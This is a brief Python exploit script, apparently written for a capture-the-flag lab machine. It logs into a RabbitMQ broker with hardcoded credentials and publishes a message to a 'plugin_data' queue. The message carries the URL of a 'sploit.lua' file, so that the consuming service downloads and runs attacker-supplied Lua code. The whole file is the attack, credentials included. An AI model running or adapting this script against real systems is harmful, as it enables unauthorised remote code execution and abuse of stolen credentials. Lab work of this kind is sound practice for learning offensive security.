import pika
c = pika.credentials.PlainCredentials('yuntao',
        'EashAnicOc3Op',
        )

p = pika.ConnectionParameters(
        host='10.10.10.190',
        port=5672,
        virtual_host = "/",
        credentials = c,
        )

connection = pika.BlockingConnection(
        parameters = p,
        )

channel = connection.channel()

channel.queue_declare(
        queue='',
        durable=True,
        )

channel.basic_publish(
        exchange='',
        routing_key='plugin_data',
        body='http://localhost:1338/sploit.lua',
        )

connection.close()
